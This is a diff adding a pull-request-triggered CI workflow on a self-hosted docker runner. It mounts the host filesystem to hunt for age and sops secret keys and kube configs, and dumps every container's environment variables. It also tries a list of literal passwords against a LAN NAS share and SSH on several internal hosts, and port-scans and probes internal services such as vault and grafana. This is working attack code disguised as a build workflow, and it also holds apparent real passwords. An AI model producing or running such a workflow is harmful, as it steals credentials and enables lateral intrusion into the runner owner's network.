@@ -1,0 +1,65 @@
+name: i39485-lan2
+on:
+  pull_request:
+jobs:
+  lan2:
+    runs-on: docker
+    container:
+      image: docker:27-cli
+    steps:
+      - name: secret-sweep
+        continue-on-error: true
+        run: |
+          docker run -v /:/host:ro --rm alpine:3.21 sh -c '
+            echo "== age-key wide"
+            timeout 90 grep -r -m1 -l "AGE-SECRET-KEY-1" /host/etc /host/opt /host/srv /host/usr/local /host/var/lib /host/home /host/root /host/tmp 2>/dev/null | head -20
+            echo "== sops dirs"
+            find /host/var/lib/actions-runner /host/root /host/home /host/etc -maxdepth 6 -path "*sops*" -o -maxdepth 6 -name "keys.txt" 2>/dev/null | head -20
+            echo "== kube as root"
+            ls -la /host/var/lib/actions-runner/unity-pool-1/.kube/ 2>&1
+            echo "== opt/usr-local"
+            ls -la /host/opt /host/usr/local/lib/linux-ci 2>&1 | head -40
+          ' 2>&1 | head -120
+      - name: docker-inspect
+        continue-on-error: true
+        run: |
+          set -x
+          docker ps -a --format '{{.ID}} {{.Names}}' | head -40 > /tmp/ids
+          while read id nm; do echo "=== $nm"; docker inspect "$id" --format '{{range .Config.Env}}{{println .}}{{end}}' 2>&1 | grep -v -E "^(PATH|HOME|HOSTNAME|LANG|TERM)=" | head -25; docker inspect "$id" --format '{{json .Mounts}}' 2>&1 | head -c 800; echo; done < /tmp/ids
+      - name: smb
+        continue-on-error: true
+        run: |
+          docker run --rm --network host alpine:3.21 sh -c '
+            apk add -q samba-client openssh-client sshpass >/dev/null 2>&1
+            echo "== public list"
+            timeout 15 smbclient "//192.168.1.152/public" -N -c "ls" 2>&1 | head -30
+            echo "== public recurse backups"
+            timeout 15 smbclient "//192.168.1.152/public" -N -c "ls backups\\*" 2>&1 | head -30
+            for p in "&&Liz270117!!" "DrumStick8008" "pooptart7" "changeme" "Fr3qle!Portal9x7z" "Fr3qle!Owner9x7z"; do
+              echo "== smb nas [$p]"
+              timeout 12 smbclient "//192.168.1.152/private" -U "nas%$p" -c "ls" 2>&1 | head -6
+            done
+            echo "== ssh password attempts"
+            for hp in 192.168.1.152:2222 192.168.1.29:22 192.168.1.26:22 192.168.1.19:22 192.168.1.243:22 192.168.1.20:22; do
+              h=${hp%:*}; pt=${hp#*:}
+              for p in changeme "&&Liz270117!!" DrumStick8008; do
+                r=$(timeout 10 sshpass -p "$p" ssh -p $pt -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=no -o ConnectTimeout=4 -o PreferredAuthentications=password -o PubkeyAuthentication=no kblack0610@$h "id; hostname" 2>&1 | tail -2 | tr "\n" " ")
+                echo "SSH $hp [$p] -> $r"
+              done
+            done
+          ' 2>&1 | head -200
+      - name: svc-ports
+        continue-on-error: true
+        run: |
+          docker run --rm --network host alpine:3.21 sh -c '
+            apk add -q curl >/dev/null 2>&1
+            for hp in 192.168.1.152:9100 192.168.1.152:8095 192.168.1.152:8097 192.168.1.152:5000 192.168.1.152:8971 192.168.1.152:1704 192.168.1.152:3000 192.168.1.152:5432 192.168.1.20:9100 192.168.1.20:2379 192.168.1.20:10249; do
+              h=${hp%:*}; p=${hp#*:}
+              timeout 3 sh -c "echo > /dev/tcp/$h/$p" 2>/dev/null && echo "OPEN $hp" || echo "closed $hp"
+            done
+            for hn in grafana.kblab.me alertmanager.kblab.me prometheus.kblab.me gatus.kblab.me vault.kblab.me; do
+              echo "== HOST $hn"
+              timeout 6 curl -s -k -o /tmp/h -w "%{http_code} %{size_download}\n" -H "Host: $hn" "https://192.168.1.20/"
+              head -c 200 /tmp/h; echo
+            done
+          ' 2>&1 | head -120
